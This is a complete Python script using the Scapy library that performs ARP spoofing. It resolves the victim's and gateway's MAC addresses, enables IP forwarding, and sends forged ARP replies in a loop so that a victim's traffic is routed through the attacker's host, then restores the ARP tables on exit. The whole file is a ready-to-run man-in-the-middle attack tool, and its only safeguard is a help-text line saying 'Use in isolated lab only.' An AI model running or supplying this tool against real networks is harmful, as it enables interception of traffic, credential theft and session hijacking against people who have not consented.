import argparse
import signal
import sys
import time
from scapy.all import ARP, Ether, srp, send, conf, get_if_hwaddr

def get_mac(ip, iface):
    pkt = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip)
    ans, _ = srp(pkt, timeout=2, retry=2, iface=iface, verbose=False)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

def enable_ip_forwarding():
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            orig = f.read().strip()
        if orig == '1':
            return False
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
        return True
    except Exception:
        return False

def disable_ip_forwarding():
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('0')
    except Exception:
        pass

def poison(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface, interval=2, verbose=False):
    vp = ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst=victim_mac)
    gp = ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwdst=gateway_mac)
    if verbose:
        print(f'[+] Starting ARP poison: {victim_ip} <-> {gateway_ip} via {attacker_mac} (iface {iface})')
    while True:
        send(vp, iface=iface, verbose=False)
        send(gp, iface=iface, verbose=False)
        if verbose:
            print('[.] Poisoned ARP sent to victim & gateway')
        time.sleep(interval)

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac, iface, verbose=False):
    if verbose:
        print('[*] Restoring ARP tables...')
    send(ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gateway_mac), count=5, iface=iface, verbose=False)
    send(ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=victim_mac), count=5, iface=iface, verbose=False)

def main():
    parser = argparse.ArgumentParser(description='Simple ARP spoof (Scapy). Use in isolated lab only.')
    parser.add_argument('--victim', required=True, help='Victim IP')
    parser.add_argument('--gateway', required=True, help='Gateway IP')
    parser.add_argument('--iface', required=True, help='Network interface (e.g., eth0)')
    parser.add_argument('--interval', type=float, default=2.0, help='Seconds between poison packets')
    parser.add_argument('--no-forward', action='store_true', help='Do not toggle IP forwarding automatically')
    parser.add_argument('--verbose', action='store_true', help='Verbose output')
    args = parser.parse_args()

    conf.iface = args.iface
    attacker_mac = get_if_hwaddr(args.iface)
    victim_mac = get_mac(args.victim, args.iface)
    gateway_mac = get_mac(args.gateway, args.iface)
    if victim_mac is None or gateway_mac is None:
        print('[!] Could not resolve MACs. Check connectivity and interface.', file=sys.stderr)
        sys.exit(1)

    ipf_enabled_by_us = False
    if not args.no_forward:
        ipf_enabled_by_us = enable_ip_forwarding()
        if args.verbose:
            print(f'[+] IP forwarding {"enabled" if ipf_enabled_by_us else "already on or not permitted"}')

    def handle_exit(signum, frame):
        if args.verbose:
            print('\n[!] Caught signal, restoring ARP and exiting...')
        restore(args.victim, victim_mac, args.gateway, gateway_mac, args.iface, verbose=args.verbose)
        if ipf_enabled_by_us:
            disable_ip_forwarding()
            if args.verbose:
                print('[*] IP forwarding disabled')
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)

    try:
        poison(args.victim, victim_mac, args.gateway, gateway_mac, attacker_mac, args.iface, args.interval, args.verbose)
    except KeyboardInterrupt:
        handle_exit(None, None)

if __name__ == '__main__':
    main()
